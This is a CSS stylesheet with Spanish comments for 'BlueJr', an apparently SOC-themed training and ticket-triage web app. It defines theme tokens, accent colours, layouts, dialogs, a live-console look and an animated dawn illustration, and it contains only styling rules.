/* BlueJr · estilos
 * Tokens del sistema de Yoandy (oscuro por defecto, claro con data-theme, siete acentos con data-accent).
 * Movimiento: ease-out fuerte, sin rebote, escala 0,97 al pulsar; con movimiento reducido, solo fundidos. */
:root {
  --font-sans: 'Outfit', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', sans-serif;
  --font-mono: 'Geist Mono', ui-monospace, 'SF Mono', Menlo, monospace;
  /* Oscuro sin negro ni blanco puros: superficie principal #1D2127 y secundaria #252930,
     texto principal #D1D7E0 y secundario #AAAEB6. La profundidad la dan las sombras
     (con un brillo de 1 px arriba), no los bordes. */
  --ground: #171b21; --sidebar: #1d2127; --surface: #1d2127; --surface-2: #252930; --surface-3: #2b3038;
  --hair: rgb(255 255 255 / 0.05); --hair-2: rgb(255 255 255 / 0.10);
  --ink: #d1d7e0; --ink-2: #aaaeb6; --ink-3: #9ea3ab; --ink-4: #6f757e;
  --accent: #6b9bff; --accent-strong: #9dbdff; --accent-ink: #041226;
  --critica: #ff6b6b; --alta: #ffa25a; --media: #e8cb66; --baja: #9ea3ab; --ok: #5ad893; --ko: #ff6b6b;
  --critica-fill: #f03e5a; --alta-fill: #ff9f43; --media-fill: #ffe36e; --baja-fill: #8f9aa6;
  --sh-panel: inset 0 1px 0 rgb(255 255 255 / 0.04), 0 1px 2px rgb(0 0 0 / 0.30), 0 12px 32px -10px rgb(0 0 0 / 0.50);
  --sh-hover: inset 0 1px 0 rgb(255 255 255 / 0.05), 0 2px 4px rgb(0 0 0 / 0.30), 0 22px 44px -14px rgb(0 0 0 / 0.60);
  --sh-overlay: inset 0 1px 0 rgb(255 255 255 / 0.05), 0 8px 20px rgb(0 0 0 / 0.30), 0 28px 72px -12px rgb(0 0 0 / 0.60);
  --glass: rgb(29 33 39 / 0.84); --glass-thick: rgb(29 33 39 / 0.97);
  --r-chip: 6px; --r-control: 10px; --r-card: 14px; --r-panel: 18px;
  --ease-out: cubic-bezier(0.23, 1, 0.32, 1); --ease-drawer: cubic-bezier(0.32, 0.72, 0, 1);
  color-scheme: dark;
}
[data-theme='light'] {
  color-scheme: light;
  --ground: #f3f5f7; --sidebar: #ffffff; --surface: #ffffff; --surface-2: #eef1f4; --surface-3: #e2e6eb;
  --hair: rgb(0 0 0 / 0.07); --hair-2: rgb(0 0 0 / 0.12);
  --ink: #101418; --ink-2: #2c3440; --ink-3: #5c6773; --ink-4: #8b949e;
  --accent: #1a4fe0; --accent-strong: #123db8; --accent-ink: #ffffff;
  --critica: #a8234a; --alta: #9c3d08; --media: #7a5600; --baja: #5c6773; --ok: #146c38; --ko: #a8234a;
  --critica-fill: #a8234a; --alta-fill: #dd6b3d; --media-fill: #eab84f; --baja-fill: #8c96a3;
  --sh-panel: 0 1px 3px rgb(0 0 0 / 0.04), 0 10px 25px -5px rgb(0 0 0 / 0.06);
  --sh-overlay: 0 4px 14px rgb(0 0 0 / 0.08), 0 25px 50px -10px rgb(0 0 0 / 0.16);
  --sh-hover: 0 2px 6px rgb(0 0 0 / 0.06), 0 22px 44px -16px rgb(16 24 40 / 0.22);
  --glass: rgb(255 255 255 / 0.86); --glass-thick: rgb(255 255 255 / 0.97);
}
[data-accent='rosa'] { --accent: #ff7ab8; --accent-strong: #ffc0de; --accent-ink: #3b0620; }
[data-theme='light'][data-accent='rosa'] { --accent: #b8155a; --accent-strong: #9a0f4a; --accent-ink: #ffffff; }
[data-accent='solar'] { --accent: #ffb020; --accent-strong: #ffd27a; --accent-ink: #2a1600; }
[data-theme='light'][data-accent='solar'] { --accent: #8a4a00; --accent-strong: #703c00; --accent-ink: #ffffff; }
[data-accent='glaciar'] { --accent: #5ee7f5; --accent-strong: #b6f6ff; --accent-ink: #042028; }
[data-theme='light'][data-accent='glaciar'] { --accent: #0a6a7d; --accent-strong: #085968; --accent-ink: #ffffff; }
[data-accent='orquidea'] { --accent: #b79bff; --accent-strong: #ddd0ff; --accent-ink: #1a0838; }
[data-theme='light'][data-accent='orquidea'] { --accent: #5b35f0; --accent-strong: #4a22d6; --accent-ink: #ffffff; }
[data-accent='verde'] { --accent: #5aa86a; --accent-strong: #8fd4a0; --accent-ink: #06210f; }
[data-theme='light'][data-accent='verde'] { --accent: #1a6b36; --accent-strong: #12552a; --accent-ink: #ffffff; }
[data-accent='azul'] { --accent: #6b9bff; --accent-strong: #9dbdff; --accent-ink: #041226; }
[data-theme='light'][data-accent='azul'] { --accent: #1a4fe0; --accent-strong: #123db8; --accent-ink: #ffffff; }
[data-accent='rojo'] { --accent: #ff6b6b; --accent-strong: #ffb0b0; --accent-ink: #2a0808; }
[data-theme='light'][data-accent='rojo'] { --accent: #b3141a; --accent-strong: #930f14; --accent-ink: #ffffff; }
:root { --tint: color-mix(in srgb, var(--accent) 14%, transparent); }

/* ---------- Base ---------- */
*, *::before, *::after { box-sizing: border-box; }
html { -webkit-text-size-adjust: 100%; }
body { margin: 0; background: var(--ground); color: var(--ink); font: 400 0.9375rem/1.55 var(--font-sans); -webkit-font-smoothing: antialiased; }
button, input, textarea { font: inherit; color: inherit; }
button { cursor: pointer; }
a { color: var(--accent); text-underline-offset: 3px; }
h1, h2, h3 { margin: 0; letter-spacing: -0.02em; line-height: 1.2; }
p { margin: 0; }
code, kbd, .num { font-variant-numeric: tabular-nums; }
code, kbd { font-family: var(--font-mono); font-size: 0.85em; }
kbd { padding: 1px 6px; border-radius: var(--r-chip); background: var(--surface-3); color: var(--ink-2); border: 1px solid var(--hair-2); white-space: nowrap; }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: var(--r-chip); }
.ic { width: 18px; height: 18px; flex: none; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
.sr-only { position: absolute !important; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
.saltar { position: absolute; left: 12px; top: -60px; z-index: 50; padding: 10px 14px; border-radius: var(--r-control); background: var(--accent); color: var(--accent-ink); font-weight: 600; text-decoration: none; transition: top 200ms var(--ease-out); }
.saltar:focus { top: 12px; }
.nota { color: var(--ink-3); font-size: 0.85rem; }
.vacio { color: var(--ink-3); padding: 24px 0; text-align: center; }

/* ---------- Estructura ---------- */
/* Lateral: completo (260 px) o carril de iconos (64 px). En carril se despliega por encima del
   contenido al pasar el ratón o al entrar con el teclado, sin mover la página. */
.app { --lw: 260px; display: grid; grid-template-columns: calc(var(--lw) + 12px) minmax(0, 1fr); min-height: 100dvh; transition: grid-template-columns 320ms var(--ease-drawer); }
body.lateral-compacto .app { --lw: 64px; }
.lateral { --w: var(--lw); position: sticky; top: 0; z-index: 25; height: 100dvh; width: calc(var(--w) + 12px); padding: 12px 0 12px 12px; display: flex; flex-direction: column; overflow: hidden; transition: width 320ms var(--ease-drawer); }
.lateral::before { content: ''; position: absolute; inset: 12px 0 12px 12px; border-radius: 26px; background: var(--sidebar); border: 1px solid var(--hair); box-shadow: var(--sh-panel); z-index: -1; transition: box-shadow 320ms var(--ease-out); }
.lateral > * { width: var(--w); transition: width 320ms var(--ease-drawer); }
body.lateral-compacto .lateral:is(:hover, :focus-within) { --w: 260px; }

.campo textarea { resize: vertical; line-height: 1.5; }
.campo input:focus, .campo textarea:focus { outline: 0; border-color: var(--accent); box-shadow: 0 0 0 3px var(--tint); }
.campo input[readonly], .campo textarea[readonly] { opacity: 0.8; }
.campo small { color: var(--ink-3); font: 500 0.6875rem var(--font-mono); }
.evidencias ol { margin: 0; padding: 0; list-style: none; display: grid; gap: 4px; }
.evidencias code { display: block; padding: 6px 8px; border-radius: 8px; background: var(--ground); border: 1px solid var(--hair); font-size: 0.6875rem; color: var(--ink-2); overflow-wrap: anywhere; }
.ticket-pie { display: flex; align-items: center; justify-content: flex-end; flex-wrap: wrap; gap: 10px; }
.ticket-pie .nota { margin-right: auto; }

.resultado { display: grid; gap: 12px; padding: 16px; border-radius: var(--r-card); background: var(--surface-2); border: 1px solid var(--hair-2); outline: none; animation: entra 360ms var(--ease-out) both; }
.res-cab { display: flex; align-items: flex-end; justify-content: space-between; }
.nota-grande { font: 700 2.4rem/1 var(--font-sans); letter-spacing: -0.04em; }
.nota-grande span { font-size: 1rem; color: var(--ink-3); font-weight: 500; }
.resultado.ok .nota-grande { color: var(--ok); }
.resultado.ko .nota-grande { color: var(--alta); }
.criterios { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
.criterios li { display: grid; grid-template-columns: 18px minmax(0, 1fr) auto; gap: 8px; align-items: start; font-size: 0.8125rem; }
.criterios li.ok > .ic { color: var(--ok); }
.criterios li.ko > .ic { color: var(--alta); }
.crit { display: grid; gap: 2px; }
.crit small { color: var(--ink-3); overflow-wrap: anywhere; }
.criterios .num { font: 600 0.75rem var(--font-mono); color: var(--ink-2); }
.resultado h3 { font-size: 0.875rem; }
.explica { font-size: 0.875rem; color: var(--ink-2); }

/* ---------- Historial ---------- */
.kpis { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; margin-bottom: 14px; }
.kpi { display: grid; gap: 4px; padding: 16px 18px; border-radius: var(--r-panel); background: var(--surface); border: 1px solid var(--hair); box-shadow: var(--sh-panel); }
.kpi span { color: var(--ink-3); font-size: 0.8125rem; }
.kpi b { font-size: clamp(1.5rem, 1.2rem + 1vw, 2rem); letter-spacing: -0.035em; font-weight: 700; white-space: nowrap; }
.kpi b small { font-size: 0.55em; color: var(--ink-3); font-weight: 500; }
.kpi.aviso b { color: var(--alta); }
.hist-rej { display: grid; grid-template-columns: minmax(0, 1.2fr) minmax(0, 1fr); gap: 14px; margin-bottom: 14px; }
.competencias { list-style: none; margin: 14px 0 0; padding: 0; display: grid; gap: 12px; }
.competencias li { display: grid; grid-template-columns: 170px minmax(0, 1fr) 32px; gap: 4px 12px; align-items: center; }
.competencias small { grid-column: 2 / -1; color: var(--ink-3); font: 500 0.6875rem var(--font-mono); }
.c-nom { font-size: 0.875rem; font-weight: 500; }
.c-barra { height: 10px; border-radius: 999px; background: var(--surface-3); overflow: hidden; }
.c-barra i { display: block; height: 100%; border-radius: inherit; background: var(--accent); transition: width 600ms var(--ease-out); }
.c-val { font: 600 0.8125rem var(--font-mono); text-align: right; }
.hist-turnos, .hist-tickets { list-style: none; margin: 0; padding: 0; display: grid; gap: 4px; }
.hist-turnos a { display: grid; grid-template-columns: 36px minmax(0, 1fr) auto 36px; gap: 10px; align-items: center; padding: 8px; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 0.875rem; transition: background-color 160ms var(--ease-out); }
.hist-turnos a:hover, .hist-tickets a:hover { background: var(--surface-2); }
.hist-turnos .tc-num { width: 32px; height: 32px; border-radius: 10px; font-size: 0.875rem; }
.hist-turnos .num { color: var(--ink-3); font-size: 0.75rem; font-family: var(--font-mono); }
.hist-turnos .estado { justify-content: flex-end; font-family: var(--font-mono); }
.acciones-datos { display: flex; flex-wrap: wrap; gap: 8px; }
.hist-tickets a { display: grid; grid-template-columns: 56px minmax(0, 1fr) auto 44px; gap: 12px; align-items: center; padding: 8px; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 0.875rem; }
.hist-tickets .id { font: 500 0.75rem var(--font-mono); color: var(--ink-3); }
.ht-tit { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ht-dec { color: var(--ink-3); font-size: 0.8125rem; white-space: nowrap; }
.nota-chip { justify-self: end; font: 600 0.8125rem var(--font-mono); }
.nota-chip.ok { color: var(--ok); } .nota-chip.ko { color: var(--alta); }

/* ---------- Diálogos ---------- */
dialog.dlg { padding: 0; border: 1px solid var(--hair-2); border-radius: 24px; background: var(--glass-thick); color: var(--ink); box-shadow: var(--sh-overlay); width: min(560px, calc(100% - 24px)); max-height: min(86dvh, 820px); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); }
dialog.dlg.grande { width: min(860px, calc(100% - 24px)); }
dialog.dlg.peq { width: min(440px, calc(100% - 24px)); }
dialog.dlg[open] { display: flex; flex-direction: column; animation: dlg-entra 300ms var(--ease-out) both; }
@keyframes dlg-entra { from { opacity: 0; transform: translateY(8px) scale(0.98); } }
dialog::backdrop { background: rgb(4 6 8 / 0.5); backdrop-filter: blur(4px); }
.perfil-f { display: contents; }
.dlg-cab { display: flex; align-items: center; justify-content: space-between; padding: 18px 18px 10px 24px; }
.dlg-cab h2 { font-size: 1.15rem; }
.dlg-cuerpo { padding: 8px 24px 20px; overflow-y: auto; display: grid; gap: 12px; align-content: start; outline: none; }
.dlg-cuerpo h3 { font-size: 0.9375rem; margin-top: 8px; }
.dlg-pie { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 14px 24px; border-top: 1px solid var(--hair); color: var(--ink-3); font-size: 0.8125rem; }
.dlg.peq .dlg-pie { justify-content: flex-end; }
.tabs { display: flex; gap: 4px; padding: 0 20px; border-bottom: 1px solid var(--hair); overflow-x: auto; scrollbar-width: none; }
.tabs [role='tab'] { position: relative; height: 42px; padding: 0 12px; border: 0; background: none; color: var(--ink-3); font-weight: 500; white-space: nowrap; }
.tabs [role='tab'][aria-selected='true'] { color: var(--ink); }
.tabs [role='tab'][aria-selected='true']::after { content: ''; position: absolute; left: 10px; right: 10px; bottom: -1px; height: 2px; border-radius: 2px; background: var(--accent); }
.pasos { margin: 0; padding: 0; list-style: none; counter-reset: p; display: grid; gap: 12px; }
.pasos li { counter-increment: p; display: grid; grid-template-columns: 30px 1fr; gap: 2px 12px; }
.pasos li::before { content: counter(p); grid-row: span 2; display: grid; place-items: center; width: 30px; height: 30px; border-radius: 10px; background: var(--tint); color: var(--accent); font: 600 0.8125rem var(--font-mono); }
.pasos span { color: var(--ink-2); font-size: 0.875rem; }
.tabla-pesos { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
.tabla-pesos td { padding: 8px 0; border-bottom: 1px solid var(--hair); }
.tabla-pesos td.num { text-align: right; font: 600 0.875rem var(--font-mono); width: 60px; }
.tabla-pesos .total td { font-weight: 700; border-bottom: 0; }
.inventario, .glosario, .atajos { margin: 0; display: grid; gap: 8px; }
.inventario div, .glosario div, .atajos div { display: grid; grid-template-columns: minmax(150px, 220px) 1fr; gap: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--hair); }
.inventario dt, .glosario dt { font-weight: 600; }
.inventario dt .num { color: var(--ink-3); font: 500 0.75rem var(--font-mono); margin-left: 6px; }
dd { margin: 0; color: var(--ink-2); font-size: 0.875rem; }
.autor { display: flex; gap: 14px; align-items: center; }
.autor > div { display: grid; gap: 2px; }
.autor span { color: var(--ink-2); font-size: 0.875rem; }
.enlaces { display: flex; flex-wrap: wrap; gap: 14px; margin-top: 4px; }
.enlaces a { display: inline-flex; align-items: center; gap: 6px; font-size: 0.875rem; }
.enlaces .ic { width: 16px; height: 16px; }
.eco { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; }
.eco li { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; background: var(--surface-2); }
.eco li > div { flex: 1; display: grid; min-width: 0; }
.eco span { color: var(--ink-3); font-size: 0.8125rem; }
dialog.buscar { width: min(620px, calc(100% - 24px)); margin-top: 12dvh; }
.buscar-cab { display: flex; align-items: center; gap: 10px; padding: 14px 16px; border-bottom: 1px solid var(--hair); color: var(--ink-3); }
.buscar-cab input { flex: 1; min-width: 0; border: 0; outline: 0; background: none; font-size: 1rem; color: var(--ink); }
.q-res { padding: 8px; overflow-y: auto; max-height: 56dvh; }
.q-grupo { padding: 10px 10px 4px; font: 500 0.6875rem var(--font-mono); letter-spacing: 0.12em; text-transform: uppercase; color: var(--ink-3); }
.q-item { display: flex; align-items: center; gap: 10px; padding: 9px 10px; border-radius: 10px; cursor: pointer; font-size: 0.875rem; }
.q-item .ic { color: var(--ink-3); width: 16px; height: 16px; }
.q-item[aria-selected='true'], .q-item:hover { background: var(--tint); }

/* ---------- Portada ---------- */
.portada { position: relative; display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); gap: 32px; align-items: center; padding: 36px; margin-bottom: 18px; border-radius: 28px; background:
    radial-gradient(120% 90% at 0% 0%, color-mix(in srgb, var(--accent) 16%, transparent), transparent 55%),
    radial-gradient(90% 80% at 100% 100%, color-mix(in srgb, #7c4dff 12%, transparent), transparent 60%),
    var(--surface); border: 1px solid var(--hair); box-shadow: var(--sh-panel); overflow: hidden; }
.p-txt { display: grid; gap: 16px; align-content: center; }
.portada h1 { font-size: clamp(2.4rem, 1.3rem + 3.3vw, 4.4rem); font-weight: 800; line-height: 1; letter-spacing: -0.045em; text-wrap: balance; }
.portada .entradilla { font-size: 1.05rem; max-width: 52ch; text-wrap: pretty; }
.p-cta { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; margin-top: 6px; }
.btn.grande { min-height: 50px; padding: 0 22px; font-size: 0.975rem; }
.btn.grande .ic { width: 18px; height: 18px; }

/* Consola en directo: oscura en los dos temas, como una consola de verdad. */
.flujo { --c-fondo: #13161b; --c-tinta: #c9d1db; --c-tenue: #9aa3ad; display: grid; grid-template-rows: auto 1fr auto; height: 340px; border-radius: 20px; background: var(--c-fondo); color: var(--c-tinta); box-shadow: inset 0 1px 0 rgb(255 255 255 / 0.05), 0 24px 60px -20px rgb(0 0 0 / 0.55); overflow: hidden; font: 0.71875rem/22px var(--font-mono); }
.flujo-cab { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid rgb(255 255 255 / 0.06); color: var(--c-tenue); font-size: 0.6875rem; letter-spacing: 0.08em; text-transform: uppercase; }
.vivo { width: 8px; height: 8px; border-radius: 50%; background: #4ad38a; box-shadow: 0 0 0 0 rgb(74 211 138 / 0.6); animation: vivo 1.8s var(--ease-out) infinite; }
@keyframes vivo { 70% { box-shadow: 0 0 0 7px rgb(74 211 138 / 0); } 100% { box-shadow: 0 0 0 0 rgb(74 211 138 / 0); } }
.flujo-pts { margin-left: auto; display: flex; gap: 5px; }
.flujo-pts i { width: 9px; height: 9px; border-radius: 50%; background: rgb(255 255 255 / 0.12); }
.flujo-lineas { list-style: none; margin: 0; padding: 8px 0; display: flex; flex-direction: column; justify-content: flex-end; overflow: hidden; }
.fl { display: grid; grid-template-columns: 62px 86px minmax(0, 1fr) auto; gap: 10px; align-items: center; height: 22px; padding: 0 14px; white-space: nowrap; }
.fl .num { color: var(--c-tenue); }
.fl .fs { color: #8fb4ff; overflow: hidden; text-overflow: ellipsis; }
.fl .fm { overflow: hidden; text-overflow: ellipsis; }
.fl.senal { background: linear-gradient(90deg, color-mix(in srgb, var(--accent) 26%, transparent), transparent 80%); box-shadow: inset 2px 0 0 var(--accent); color: #f2f5f8; }
.fl.senal em { font-style: normal; padding: 0 7px; border-radius: 999px; background: var(--accent); color: var(--accent-ink); font: 600 0.625rem/16px var(--font-sans); letter-spacing: 0.04em; text-transform: uppercase; }
.flujo-pie { padding: 12px; border-top: 1px solid rgb(255 255 255 / 0.06); }
.fl-ticket { display: grid; grid-template-columns: auto auto minmax(0, 1fr); grid-template-areas: 'id sev tit' 'dec dec dec'; gap: 4px 10px; align-items: center; padding: 10px 12px; border-radius: 12px; background: rgb(255 255 255 / 0.05); box-shadow: inset 0 1px 0 rgb(255 255 255 / 0.05); font-family: var(--font-sans); animation: ticket-entra 420ms var(--ease-out) both; }
@keyframes ticket-entra { from { opacity: 0; transform: translateY(10px) scale(0.98); } }
.fl-ticket > .num { grid-area: id; color: var(--c-tenue); font: 500 0.6875rem var(--font-mono); }
.fl-ticket .sev { grid-area: sev; }
.fl-ticket b { grid-area: tit; font-size: 0.8125rem; font-weight: 600; color: #f2f5f8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.fl-dec { grid-area: dec; font-size: 0.75rem; color: #8fe0b0; }
.flujo .sev-critica { --c: #ff8a8a; } .flujo .sev-alta { --c: #ffb57a; } .flujo .sev-media { --c: #f0d27a; } .flujo .sev-baja { --c: #b8bec7; }
.flujo .sev { color: var(--c); background: color-mix(in srgb, var(--c) 16%, transparent); }

/* Tarjetas de estadística (StatsCard): vidrio, icono con degradado y elevación de 5 px al pasar. */
.stats { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 14px; margin-bottom: 28px; }
.stat { display: flex; align-items: flex-start; justify-content: space-between; gap: 12px; padding: 22px 22px 20px; border-radius: 20px; background: linear-gradient(180deg, color-mix(in srgb, var(--surface) 92%, white 8%), var(--surface)); border: 1px solid var(--hair); box-shadow: var(--sh-panel); transition: transform 320ms var(--ease-out), box-shadow 320ms var(--ease-out); }
[data-theme='light'] .stat { background: var(--surface); }
.stat-t { color: var(--ink-2); font-size: 0.875rem; }
.stat-v { margin-top: 4px; font-size: clamp(1.7rem, 1.3rem + 1vw, 2.15rem); font-weight: 700; letter-spacing: -0.035em; line-height: 1.1; }
.stat-c { display: inline-flex; align-items: center; gap: 4px; margin-top: 8px; font-size: 0.8125rem; color: var(--ink-3); }
.stat-c.sube { color: var(--ok); font-weight: 500; }
.stat-c .ic { width: 15px; height: 15px; }
.stat-ic { display: grid; place-items: center; width: 46px; height: 46px; flex: none; border-radius: 14px; color: #fff; background: linear-gradient(135deg, var(--g1), var(--g2)); box-shadow: 0 10px 22px -10px var(--g1); }
.stat-ic .ic { width: 21px; height: 21px; }
.tono-a { --g1: var(--accent); --g2: #7c4dff; }
.tono-b { --g1: #12b886; --g2: #0ca5c9; }
.tono-c { --g1: #f59f00; --g2: #f76707; }
.tono-d { --g1: #e64980; --g2: #9c36b5; }
.sec-t { display: flex; align-items: center; gap: 10px; margin: 0 0 14px; font-size: 1.15rem; font-weight: 600; }
.sec-t .ic { color: var(--accent); }

/* Elevación al pasar el ratón: solo con ratón y sin movimiento reducido. */
@media (hover: hover) and (pointer: fine) and (prefers-reduced-motion: no-preference) {
  .stat:hover, .kpi:hover { transform: translateY(-5px); box-shadow: var(--sh-hover); }
  .turno-card:hover { transform: translateY(-4px); box-shadow: var(--sh-hover); }
  .stat:has(:focus-visible), .turno-card:has(:focus-visible) { transform: none; }
}
.kpi { transition: transform 320ms var(--ease-out), box-shadow 320ms var(--ease-out); }

@media (max-width: 1100px) {
  .portada { grid-template-columns: minmax(0, 1fr); padding: 28px; }
  .stats { grid-template-columns: repeat(2, minmax(0, 1fr)); }
}
@media (max-width: 640px) {
  .portada { padding: 22px 18px; gap: 22px; border-radius: 24px; }
  .flujo { height: 300px; }
  .fl { grid-template-columns: 56px minmax(0, 1fr) auto; }
  .fl .fs { display: none; }
  .stat { padding: 18px; }
  .stat-ic { width: 40px; height: 40px; }
  .p-cta .btn { flex: 1 1 auto; }
}

/* ---------- Portada: titular, reloj y escena del amanecer ---------- */
.portada h1 .pal { display: inline-block; overflow: hidden; vertical-align: top; padding-bottom: 0.08em; margin-bottom: -0.08em; }
.portada h1 .pal > span { display: inline-block; }
.vista.entrando .portada h1 .pal > span { animation: pal-sube 640ms var(--ease-out) backwards; animation-delay: calc(var(--i) * 45ms + 80ms); }
@keyframes pal-sube { from { transform: translateY(105%); } }
.reloj { display: inline-flex; align-items: center; gap: 8px; font: 500 0.8125rem var(--font-mono); color: var(--ink-3); letter-spacing: 0.02em; }
.reloj::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 3px color-mix(in srgb, var(--accent) 22%, transparent); }

/* La escena es una ilustración: colores fijos de risografía, el cielo sigue al acento. */
.escena { position: relative; align-self: center; width: 100%; aspect-ratio: 600 / 560; border-radius: 24px; overflow: hidden; box-shadow: inset 0 1px 0 rgb(255 255 255 / 0.06), 0 30px 60px -24px rgb(10 20 60 / 0.55); isolation: isolate; }
.escena svg { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
.escena .c1 { stop-color: #0b1238; }
.escena .c2 { stop-color: color-mix(in srgb, var(--accent) 70%, #1c2c8c); }
.escena .c3 { stop-color: #ff9b6a; }
[data-theme='light'] .escena .c1 { stop-color: #1b2a7a; }
[data-theme='light'] .escena .c3 { stop-color: #ffc59a; }
.escena .h1 { stop-color: #ff7a45; stop-opacity: 0.55; }
.escena .h2 { stop-color: #ff7a45; stop-opacity: 0; }
.escena .punto-sol { fill: #ff6a3d; }
.estrellas circle { fill: #ffffff; opacity: 0.75; animation: titila var(--d) ease-in-out var(--dl) infinite; }
@keyframes titila { 50% { opacity: 0.15; } }
.ciudad rect { fill: #182162; opacity: 0.85; }
.sede .fachada { fill: #10174a; }
.sede .remate { fill: #0b1036; }
.sede .rotulo { font: 700 13px var(--font-sans); letter-spacing: 3px; fill: #ffb547; }
.sede .nave { fill: #141c55; }
.sede .puerta { fill: #0d1340; stroke: #1f2a6e; stroke-width: 2; }
.ventana { fill: #1c2565; }
.ventana.luz { fill: #ffb547; }
.ventana.soc { fill: #ffd27a; animation: soc-late 2.4s ease-in-out infinite; }
@keyframes soc-late { 50% { fill: #ff8a3d; } }
.calle { fill: #0b1036; }
.camion .caja { fill: #f4f1ea; } .camion .cabina { fill: #ff6a3d; } .camion .rueda { fill: #0b1036; stroke: #8a93c7; stroke-width: 2; }
.camion .logo-camion { font: 800 11px var(--font-sans); fill: #10174a; }
.camion { animation: reparto 15s linear 1.2s infinite; transform: translateX(-120px); }
@keyframes reparto { from { transform: translateX(-120px); } to { transform: translateX(640px); } }

/* Al cargar: sale el sol, sube la sede y se encienden las ventanas una a una. */
.vista.entrando .sol { animation: amanece 1400ms var(--ease-out) backwards; }
@keyframes amanece { from { transform: translateY(90px); opacity: 0; } }
.vista.entrando .sede, .vista.entrando .ciudad { animation: sede-sube 760ms var(--ease-out) 120ms backwards; }
@keyframes sede-sube { from { transform: translateY(40px); opacity: 0; } }
.vista.entrando .ventana.luz, .vista.entrando .ventana.soc { animation: enciende 260ms var(--ease-out) backwards; animation-delay: calc(var(--i) * 32ms + 600ms); }
.vista.entrando .ventana.soc { animation: enciende 260ms var(--ease-out) 600ms backwards, soc-late 2.4s ease-in-out 900ms infinite; }
@keyframes enciende { from { fill: #1c2565; } }

/* Etiqueta de la ventana del SOC (posición en % del dibujo) y burbuja del último ticket. */
.escena-chip { position: absolute; left: calc((231 / 600) * 100%); top: calc(((432 - 80) / 560) * 100%); transform: translate(-50%, calc(-100% - 18px)); display: inline-flex; align-items: center; gap: 6px; padding: 6px 11px; border-radius: 10px; background: #f4f1ea; color: #10174a; font: 600 0.75rem var(--font-sans); white-space: nowrap; box-shadow: 0 8px 20px -8px rgb(0 0 0 / 0.5); }
.escena-chip::after { content: ''; position: absolute; left: 50%; top: 100%; width: 1px; height: 18px; background: #f4f1ea; }
.escena-chip i { width: 7px; height: 7px; border-radius: 50%; background: #ff6a3d; }
.vista.entrando .escena-chip { animation: chip-entra 420ms var(--ease-out) 1050ms backwards; }
@keyframes chip-entra { from { opacity: 0; transform: translate(-50%, calc(-100% - 10px)); } }
.escena-ticket { position: absolute; left: 16px; right: 16px; top: 16px; --c-tenue: #9aa3ad; }
.escena-ticket .fl-ticket { background: rgb(11 16 54 / 0.72); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); box-shadow: inset 0 1px 0 rgb(255 255 255 / 0.08), 0 12px 30px -12px rgb(0 0 0 / 0.6); }
.escena-ticket .sev { color: var(--c); background: color-mix(in srgb, var(--c) 18%, transparent); }
.escena-ticket .sev-critica { --c: #ff8a8a; } .escena-ticket .sev-alta { --c: #ffb57a; } .escena-ticket .sev-media { --c: #f0d27a; } .escena-ticket .sev-baja { --c: #b8bec7; }
.vista.entrando .escena-ticket { animation: chip-entra-t 480ms var(--ease-out) 1300ms backwards; }
@keyframes chip-entra-t { from { opacity: 0; transform: translateY(-8px); } }

/* Consola y estadísticas, juntas bajo la portada. */
.en-directo { display: grid; grid-template-columns: minmax(0, 1.15fr) minmax(0, 1fr); gap: 14px; margin-bottom: 28px; align-items: stretch; }
.en-directo .stats { grid-template-columns: repeat(2, minmax(0, 1fr)); margin: 0; }
.en-directo .flujo { height: auto; min-height: 320px; }
@media (max-width: 1100px) {
  .en-directo { grid-template-columns: minmax(0, 1fr); }
  .escena { max-width: 560px; justify-self: center; }
}
@media (max-width: 640px) {
  .en-directo .stats { grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); }
}

/* ---------- Avisos ---------- */
.toasts { position: fixed; right: 20px; bottom: 20px; z-index: 60; display: grid; gap: 8px; justify-items: end; pointer-events: none; }
.toast { display: flex; align-items: center; gap: 10px; padding: 11px 16px; border-radius: 14px; background: var(--ink); color: var(--ground); font-size: 0.875rem; font-weight: 500; box-shadow: var(--sh-overlay); animation: toast 360ms var(--ease-drawer) both; transition: opacity 260ms var(--ease-out), transform 260ms var(--ease-out); }
.toast .ic { width: 17px; height: 17px; }
.toast.sale { opacity: 0; transform: translateY(6px); }
@keyframes toast { from { opacity: 0; transform: translateY(12px); } }

/* ---------- Barra inferior (móvil) ---------- */
.abajo { display: none; }

/* ---------- Adaptación ---------- */
@media (max-width: 1240px) {
  .puesto { grid-template-columns: 230px minmax(0, 1fr); }
  .ticket { grid-column: 1 / -1; position: static; max-height: none; }
}

  .abajo [aria-current='page'] { background: var(--tint); color: var(--ink); }
  .abajo [aria-current='page'] .ic { color: var(--accent); }
  .toasts { left: 16px; right: 16px; bottom: calc(96px + env(safe-area-inset-bottom)); justify-items: stretch; }
  .seg-movil { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; padding: 4px; margin-bottom: 12px; border-radius: 14px; background: var(--surface-2); border: 1px solid var(--hair); position: sticky; top: 76px; z-index: 10; }
  .seg-movil button { height: 38px; border: 0; border-radius: 10px; background: none; color: var(--ink-3); font-weight: 600; font-size: 0.875rem; }
